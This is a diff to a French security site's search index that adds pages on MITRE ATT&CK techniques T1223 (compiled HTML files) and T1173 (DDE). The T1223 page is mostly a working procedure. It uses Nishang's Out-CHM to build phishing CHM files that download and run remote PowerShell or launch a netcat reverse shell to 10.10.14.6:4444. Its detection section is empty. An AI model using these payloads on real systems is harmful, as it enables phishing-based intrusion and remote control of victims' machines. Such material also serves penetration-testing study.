@@ -1,5 +1,12 @@
 [
 {
+	"uri": "http://lightsecops.github.io/methodologies/execution/t1223_-compiled_html_file/",
+	"title": "T1223 - Fichier HTML Compilé",
+	"tags": [],
+	"description": "",
+	"content": "T1223 - Fichier HTML Compilé ID: T1223 Tactique: Exécution,Evasion Plateforme: Windows Autorisations requises: Utilisateur Type de Défense contourné: Version: 1 Création: 23/03/2020 Dernière modification: 17/03/2020\n Description Les fichiers HTML compilés avec une extenstion (.chm) peuvent êter utilisé comme vecteur de phishing.\nProcédure $ip = adresse IP $port = Port attaquants\n - Nishang Le compilateur htmlhelp.exe est nécessaire il faut donc le télécharger et l\u0026rsquo;installer. Opération compliqué sous linux (Nécessite une machine Windows).\n  Importez tous les scripts de la session PowerShell en cours (v3 ou suppérieur) :\n PS C:\\Users\\Administrator\\Desktop\\nishang-master\u0026gt; Import-Module .\\nishang.psm1\rWARNING: The names of some imported commands from the module \u0026#39;nishang\u0026#39; include unapproved verbs that might make them less discoverable. To find the commands with unapproved verbs, run the Import-Module\rcommand again with the Verbose parameter. For a list of approved verbs, type Get-Verb.\rWARNING: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] \u0026amp; - / \\ $ ^ ; : \u0026#34; \u0026#39; \u0026lt; \u0026gt; | ? @ ` * % + = ~\r PS C:\\Users\\Administrator\\Desktop\\nishang-master\u0026gt;\r Exemples\n NAME\rOut-CHM\rSYNOPSIS\rNishang script useful for creating Compiled HTML Help file (.CHM) which could be used to run PowerShell commands and scripts.\r-------------------------- EXAMPLE 1 --------------------------\rPS \u0026gt;Out-CHM -Payload \u0026#34;Get-Process\u0026#34; -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34;\rAbove command would execute Get-Process on the target machine when the CHM file is opened.\r-------------------------- EXAMPLE 2 -------------------------- PS \u0026gt;Out-CHM -PayloadScript C:\\nishang\\Shells\\Invoke-PowerShellTcpOneLine.ps1 -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34;\rUse above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,\ryou must pass the parameters in the script itself.\r-------------------------- EXAMPLE 3 --------------------------\rPS \u0026gt;Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34;\rUse above command to generate CHM file which download and execute the given PowerShell script in memory on target.\r-------------------------- EXAMPLE 4 --------------------------\rPS \u0026gt;Out-CHM -Payload \u0026#34;-EncodedCommand \u0026lt;\u0026gt;\u0026#34; -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34;\rUse above command to generate CHM file which executes the encoded command/script.\rUse Invoke-Encode from Nishang to encode the command or script.\r-------------------------- EXAMPLE 5 --------------------------\rPS \u0026gt;Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath \u0026#34;C:\\Program Files (x86)\\HTML Help Workshop\u0026#34;\rUse above command to pass an argument to the PowerShell script/module.\r-------------------------- EXAMPLE 6 --------------------------\rPS \u0026gt;Out-CHM -PayloadScript C:\\nishang\\Shells\\Invoke-PowerShellTcpOneLine.ps1\rUse above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it,\ryou must pass the parameters in the script itself.\r Création du payload\n Out-CHM -Payload \u0026#39;C:\\Docs\\nc.exe 10.10.14.6 4444 -e powershell.exe\u0026#39; -HHCPath \u0026#39;C:\\Program Files (x86)\\HTML Help Workshop\u0026#39;\rDétection Réferences "
+},
+{
 	"uri": "http://lightsecops.github.io/vulnerability_corner/cve-2008-4037/",
 	"title": "CVE-2008-4037 aka Faux PAC",
 	"tags": [],
@@ -19,6 +26,27 @@
 	"tags": [],
 	"description": "",
 	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/execution/",
+	"title": "Execution",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/",
+	"title": "Méthodologies",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/execution/t1173_dynamic_data_exchange/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": "T1173 - Dynamic Data Exchange (DDE) ID: T1173 Tactique: Exécution Plateforme: Windows Autorisations requises: Utilisateur Sources de données:\nVersion: 1 Création: 17/03/2020 Dernière modification: 17/03/2020\n Description Le protocole DDE est une ancienne technologie de Microsoft utilisée pour facilite le transfèrer des données entre deux applications. Inter-Process Communication (IPC).\nCette technique peut être utilisé dans les scénarios de Phishing.\nl\u0026rsquo;exécution du code dans les documents Microsoft Office.\nRéférence https://docs.microsoft.com/fr-fr/windows/win32/dataxchg/about-dynamic-data-exchange?redirectedfrom=MSDN https://enigma0x3.net/2018/01/29/reviving-dde-using-onenote-and-excel-for-code-execution/ https://pentestlab.blog/2018/01/16/microsoft-office-dde-attacks/\n"
 },
 {
 	"uri": "http://lightsecops.github.io/categories/",
